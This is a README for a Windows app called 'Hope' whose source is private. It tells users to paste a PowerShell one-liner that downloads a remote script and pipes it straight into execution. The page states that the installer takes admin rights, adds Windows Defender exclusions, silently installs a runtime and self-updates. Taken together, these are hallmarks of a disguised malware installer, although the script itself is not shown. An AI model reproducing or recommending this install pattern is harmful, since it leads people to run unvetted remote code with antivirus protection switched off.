# Hope â€” release binaries

Download host for Hope. The source lives in a separate private repository.

## How to Install

Get Hope running on Windows. Install with one command.

### 1 â€” Open Command Prompt

Press **Win + R**, type `cmd`, and hit Enter. Or search for "Command Prompt" in the Start menu.

### 2 â€” Paste the Command

Copy the command below and paste it into your Command Prompt window. Right-click to paste.

Paste exactly this (copy the whole line â€” there is nothing else to type):

```cmd
powershell -Command "irm https://hope-install.pages.dev/install.ps1 | iex"
```

### 3 â€” Press Enter & Done!

Hit **Enter**. The Hope installer downloads, verifies its checksum, and asks for admin permission to install itself. A Hope shortcut appears on your Desktop when it's done.

> **What happens when you run this?**
>
> â†’ Finds the newest release for you
> â†’ Verifies the download against its published SHA-256
> â†’ Adds Windows Defender exclusions for you
> â†’ Desktop shortcut when it's done
>
> After this, Hope updates itself on launch â€” you only install once.

## Details

- **Requirements:** Windows 10/11 (64-bit). No prerequisites â€” the installer adds the browser runtime silently if it is missing.
- **Install location:** `C:\Program Files\Hope`
- **Uninstall:** *Settings â†’ Apps â†’ Hope 1.2.6 â†’ Uninstall*, or run `C:\Program Files\Hope\unins000.exe`
- **Verify your download:** SHA-256 of `HopeSetup-1.2.6.exe` â€” `BAE689BDE85AE2AFEA917DF700397E4CE2289DC2A7C605F347F7A6DF696EE818`
- **Prefer a manual download?** Take `HopeSetup-1.2.6.exe` from the [latest release](https://github.com/muleimm/h-releases/releases/latest) and run it.

## What's new in 1.2.6

- **Install from one command.** The installer script resolves the newest release itself and refuses any download whose SHA-256 does not match the published digest.
- **Duel arms without answering.** The Dual-mode hotkey now only brings up the overlay and tells you which key asks â€” nothing is captured until you press it, so you can line up the right question first.
- **No in-app AI keys or ChatGPT sign-in.** The app talks only to the gateway; provider choice and model discovery live server-side.

Latest release: [v1.2.6](https://github.com/muleimm/h-releases/releases/tag/v1.2.6) Â· All releases are kept and never overwritten.

